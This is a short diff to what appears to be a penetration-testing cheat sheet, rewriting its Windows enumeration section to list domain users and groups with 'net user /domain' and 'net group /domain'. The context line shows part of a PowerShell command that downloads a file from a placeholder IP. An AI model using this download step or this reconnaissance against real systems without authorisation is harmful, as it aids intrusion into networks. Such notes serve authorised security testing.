@@ -786,16 +786,22 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{IP ADDRES
 # Windows Enumeration Commands
 
 # CMD
-#Me
-net users %username% 
-#All local users
-net users 
-#Groups
-net localgroup 
-#Who is inside Administrators group
-net localgroup Administrators
+
 #Check the privileges
 whoami /all
+
+# Enumerate all local accounts
+net user
+
+# Enumerate entire domain
+net user /domain
+
+# Enumerate information about user
+net user {USERNAME} /domain
+
+# Enumerate all groups in domain
+net group /domain
+
 
 # PS
 Get-WmiObject -Class Win32_UserAccount
